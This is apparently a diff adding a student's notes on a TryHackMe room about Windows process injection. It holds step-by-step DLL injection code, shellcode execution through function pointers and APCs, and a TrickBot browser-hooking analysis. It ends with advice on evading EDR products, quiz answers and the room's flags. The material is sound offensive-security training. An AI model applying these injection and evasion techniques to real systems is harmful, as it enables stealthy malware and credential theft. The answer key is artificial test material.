@@ -414,3 +414,211 @@ HANDLE hProcess = OpenProcess(
 	FALSE, // Child processes do not inheret parent process handle
 	processId // Stored process ID
 );
+```
+At step three, memory must be allocated for the provided malicious DLL to reside. As with most injectors, this can be accomplished using VirtualAllocEx.
+```text
+LPVOID dllAllocatedMemory = VirtualAllocEx(
+	hProcess, // Handle for the target process
+	NULL, 
+	strlen(dllLibFullPath), // Size of the DLL path
+	MEM_RESERVE | MEM_COMMIT, // Reserves and commits pages
+	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
+);
+```
+At step four, we need to write the malicious DLL to the allocated memory location. We can use WriteProcessMemory to write to the allocated region.
+```text
+WriteProcessMemory(
+	hProcess, // Handle for the target process
+	dllAllocatedMemory, // Allocated memory region
+	dllLibFullPath, // Path to the malicious DLL
+	strlen(dllLibFullPath) + 1, // Byte size of the malicious DLL
+	NULL
+);
+```
+At step five, our malicious DLL is written to memory and all we need to do is load and execute it. To load the DLL we need to use LoadLibrary; imported from kernel32. Once loaded, CreateRemoteThread can be used to execute memory using LoadLibrary as the starting function.
+```text
+LPVOID loadLibrary = (LPVOID) GetProcAddress(
+	GetModuleHandle("kernel32.dll"), // Handle of the module containing the call
+	"LoadLibraryA" // API call to import
+);
+HANDLE remoteThreadHandler = CreateRemoteThread(
+	hProcess, // Handle for the target process
+	NULL, 
+	0, // Default size from the execuatable of the stack
+	(LPTHREAD_START_ROUTINE) loadLibrary, pointer to the starting function
+	dllAllocatedMemory, // pointer to the allocated memory region
+	0, // Runs immediately after creation
+	NULL
+);
+```
+We can compile these steps together to create a DLL injector. Use the C++ injector provided and experiment with DLL injection.
+Identify a PID and name of a process running as THM-Attacker to target. Supply the name and malicious DLL found in the Injectors directory as arguments to execute dll-injector.exe located in the Injectors directory on the desktop.
+![[Pasted image 20220912172020.png]]
+What flag is obtained after injecting the DLL?
+### Memory Execution Alternatives
+Depending on the environment you are placed in, you may need to alter the way that you execute your shellcode. This could occur when there are hooks on an API call and you cannot evade or unhook them, an EDR is monitoring threads, etc.
+Up to this point, we have primarily looked at methods of allocating and writing data to and from local/remote processes. Execution is also a vital step in any injection technique; although not as important when attempting to minimize memory artifacts and IOCs (Indicators of Compromise). Unlike allocating and writing data, execution has many options to choose from.
+Throughout this room, we have observed execution primarily through CreateThread and its counterpart, CreateRemoteThread.
+In this task we will cover three other execution methods that can be used depending on the circumstances of your environment.
+Invoking Function Pointers
+The void function pointer is an oddly novel method of memory block execution that relies solely on typecasting.
+This technique can only be executed with locally allocated memory but does not rely on any API calls or other system functionality.
+The one-liner below is the most common form of the void function pointer, but we can break it down further to explain its components.
+```text
+Function Pointer
+
+((void(*)())addressPointer)();
+```
+This one-liner can be hard to comprehend or explain since it is so dense, let's walk through it as it processes the pointer.
+Create a function pointer (void(*)(), outlined in red
+Cast the allocated memory pointer or shellcode array into the function pointer (<function pointer>)addressPointer), outlined in yellow
+Invoke the function pointer to execute the shellcode ();, outlined in green
+This technique has a very specific use case but can be very evasive and helpful when needed.
+Asynchronous Procedure Calls
+From the Microsoft documentation on Asynchronous Procedure Calls, “An asynchronous procedure call (APC) is a function that executes asynchronously in the context of a particular thread.”
+An APC function is queued to a thread through QueueUserAPC. Once queued the APC function results in a software interrupt and executes the function the next time the thread is scheduled.
+In order for a userland/user-mode application to queue an APC function the thread must be in an “alertable state”. An alertable state requires the thread to be waiting for a callback such as WaitForSingleObject or Sleep.
+Now that we understand what APC functions are let's look at how they can be used maliciously! We will use VirtualAllocEx and WriteProcessMemory for allocating and writing to memory.
+```text
+QueueUserAPC(
+	(PAPCFUNC)addressPointer, // APC function pointer to allocated memory defined by winnt
+	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
+	(ULONG_PTR)NULL
+	);
+ResumeThread(
+	pinfo.hThread // Handle to thread from PROCESS_INFORMATION structure
+);
+WaitForSingleObject(
+	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
+	INFINITE // Wait infinitely until alerted
+);
+```
+This technique is a great alternative to thread execution, but it has recently gained traction in detection engineering and specific traps are being implemented for APC abuse. This can still be a great option depending on the detection measures you are facing.
+Section Manipulation
+A commonly seen technique in malware research is PE (Portable Executable) and section manipulation. As a refresher, the PE format defines the structure and formatting of an executable file in Windows. For execution purposes, we are mainly focused on the sections, specifically .data and .text, tables and pointers to sections are also commonly used to execute data.
+We will not go in-depth with these techniques since they are complex and require a large technical breakdown, but we will discuss their basic principles.
+To begin with any section manipulation technique, we need to obtain a PE dump. Obtaining a PE dump is commonly accomplished with a DLL or other malicious file fed into xxd.
+At the core of each method, it is using math to move through the physical hex data which is translated to PE data.
+Some of the more commonly known techniques include RVA entry point parsing, section mapping, and relocation table parsing.
+With all injection techniques, the ability to mix and match commonly researched methods is endless. This provides you as an attacker with a plethora of options to manipulate your malicious data and execute it.
+What protocol is used to execute asynchronously in the context of a thread?
+*Asynchronous Procedure Calls*
+What is the Windows API call used to queue an APC function?
+*QueueUserAPC*
+Can the void function pointer be used on a remote process? (y/n)
+*n*
+### Case Study in Browser Injection and Hooking
+To get hands on with the implications of process injection we can observe the TTPs (Tactics, Techniques, and Procedures) of TrickBot.
+Credit for initial research: SentinelLabs https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/
+TrickBot is a well known banking malware that has recently regained popularity in financial crimeware. The main function of the malware we will be observing is browser hooking. Browser hooking allows the malware to hook interesting API calls that can be used to intercept/steal credentials.
+To begin our analysis, let’s look at how they’re targeting browsers. From SentinelLab’s reverse engineering, it is clear that OpenProcess is being used to obtain handles for common browser paths; seen in the disassembly below.
+```text
+push   eax
+push   0
+push   438h
+call   ds:OpenProcess
+mov    edi, eax
+mov    [edp,hProcess], edi
+test   edi, edi
+jz     loc_100045EE
+
+push   offset Srch            ; "chrome.exe"
+lea    eax, [ebp+pe.szExeFile]
+...
+mov    eax, ecx
+push   offset aIexplore_exe   ; "iexplore.exe"
+push   eax                    ; lpFirst
+...
+mov    eax, ecx
+push   offset aFirefox_exe   ; "firefox.exe"
+push   eax                    ; lpFirst
+...
+mov    eax, ecx
+push   offset aMicrosoftedgec   ; "microsoftedgecp.exe"
+...
+```
+The current source code for the reflective injection is unclear but SentinelLabs has outlined the basic program flow of the injection below.
+Open Target Process, OpenProcess
+Allocate memory, VirtualAllocEx
+Copy function into allocated memory, WriteProcessMemory
+Copy shellcode into allocated memory, WriteProcessMemory
+Flush cache to commit changes, FlushInstructionCache
+Create a remote thread, RemoteThread
+Resume the thread or fallback to create a new user thread, ResumeThread or RtlCreateUserThread
+Once injected TrickBot will call its hook installer function copied into memory at step three. Pseudo-code for the installer function has been provided by SentinelLabs below.
+```text
+relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;
+v8 = (unsigned __int8)original_function[5];
+trampoline_lpvoid = *(void **)(original_function + 1);
+jmp_32_bit_relative_offset_opcode = 0xE9u;		// "0xE9" -> opcode for a jump with a 32bit relative offset
+
+if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &flOldProtect) )	// Set up the function for "PAGE_EXECUTE_READWRITE" w/ VirtualProtectEx
+{
+	v10 = *(_DWORD *)(original_function + 1);
+	v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;
+	original_function[66] = 0xE9u;
+	*(_DWORD *)(original_function + 0x43) = v10 + v11;
+	write_hook_iter(v10, &jmp_32_bit_relative_offset_opcode, 5); // -> Manually write the hook
+	VirtualProtectEx(		// Return to original protect state
+		(HANDLE)0xFFFFFFFF,
+		*(LPVOID *)(original_function + 1),
+		(unsigned __int8)original_function[5],
+		flOldProtect,
+		&flOldProtect);
+result = 1;
+```
+Let’s break this code down, it may seem daunting at first, but it can be broken down into smaller sections of knowledge we have gained throughout this room.
+The first section of interesting code we see can be identified as function pointers; you may recall this from the previous task on invoking function pointers.
+```text
+relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;
+v8 = (unsigned __int8)original_function[5];
+trampoline_lpvoid = *(void **)(original_function + 1);
+```
+Once function pointers are defined the malware will use them to modify the memory protections of the function using VirtualProtectEx.
+```text
+if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &flOldProtect) )
+```
+At this point, the code turns into malware funny business with function pointer hooking. It is not essential to understand the technical requirements of this code for this room. At its bare bones, this code section will rewrite a hook to point to an opcode jump.
+```text
+v10 = *(_DWORD *)(original_function + 1);
+v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;
+original_function[66] = 0xE9u;
+*(_DWORD *)(original_function + 0x43) = v10 + v11;
+write_hook_iter(v10, &jmp_32_bit_relative_offset_opcode, 5); // -> Manually write the hook
+```
+Once hooked it will return the function to its original memory protections.
+```text
+VirtualProtectEx(		// Return to original protect state
+		(HANDLE)0xFFFFFFFF,
+		*(LPVOID *)(original_function + 1),
+		(unsigned __int8)original_function[5],
+		flOldProtect,
+		&flOldProtect);
+```
+This may still seem like a lot of code and technical knowledge being thrown and that is okay! The main takeaway of the hooking function for TrickBot is that it will inject itself into browser processes using reflective injection and hook API calls from the injected function.
+What alternative Windows API call was used by TrickBot to create a new user thread?
+*RtlCreateUserThread*
+Was the injection techniques employed by TrickBot reflective? (y/n)
+*y*
+What function name was used to manually write hooks?
+*write_hook_iter*
+### Conclusion
+Process injection is an overarching technique that can be used in many varieties and is one of the most common cases of abusing Windows Internals.
+It is important to note that as detection engineering and monitoring evolves injection techniques will need to evolve as well. Most of the techniques shown in this room will be detected by popular commercial EDRs but you can still easily modify your injectors to meet the cat and mouse game between the red and blue team.
+When preparing to incorporate an injection technique into your own work or tools we advise that you use it as only a small section of a larger tool. Mixing and matching components of injection can also be very fruitful to attempt to make your tooling as close to a legitimate application as possible.
+Add these techniques to your evasion toolbox and continue experimenting to identify what works best for the environment you are in.
+Read the above and continue learning!
+*No answer needed*
+
+## Flags / Answers
+- ***THM{1nj3c710n_15_fun!}***
+- ***THM{7h3r35_n07h1n6_h3r3}***
+- ***THM{w34p0n1z3d_53w1n6}***
+- ***THM{n07_4_m4l1c10u5_dll}***
+- ![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/56fa99f2469b86c8660a0a45ae63215f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ba04c5ef220c10b3e174bd1ca77959c6.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3c36b4470fb04e3bfdbbef0674b79ec2.png)
+
+## Notes / Lessons Learned
+[[Data Exfiltration]]
+
